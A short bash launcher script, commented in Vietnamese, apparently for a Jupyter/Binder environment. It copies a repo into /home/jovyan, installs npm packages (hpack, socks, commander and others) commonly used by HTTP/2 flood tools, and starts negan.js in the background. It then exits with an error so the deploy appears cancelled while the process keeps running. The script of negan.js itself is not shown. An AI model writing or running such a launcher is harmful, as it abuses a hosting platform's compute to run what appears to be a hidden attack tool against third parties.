#!/bin/bash

echo "--------------------------------------------------"
echo "🔄 Sao chép file từ repo..."
echo "--------------------------------------------------"

# Sao chép toàn bộ file từ repo về thư mục hiện tại
cp -r . /home/jovyan/ 2>/dev/null

echo "✅ Kiểm tra file đã copy:"
ls -lah /home/jovyan/

echo "--------------------------------------------------"
echo "🔄 Cài đặt npm package..."
echo "--------------------------------------------------"

# Cài đặt các package npm
npm install hpack https commander colors socks

echo "✅ Hoàn thành cài đặt!"

echo "--------------------------------------------------"
echo "🚀 Chạy node negan.js..."
echo "--------------------------------------------------"

# Chạy negan.js
node /home/jovyan/negan.js &

echo "✅ negan.js đang chạy!"

echo "🚨 Hủy deploy..."
exit 1  # Dừng deploy
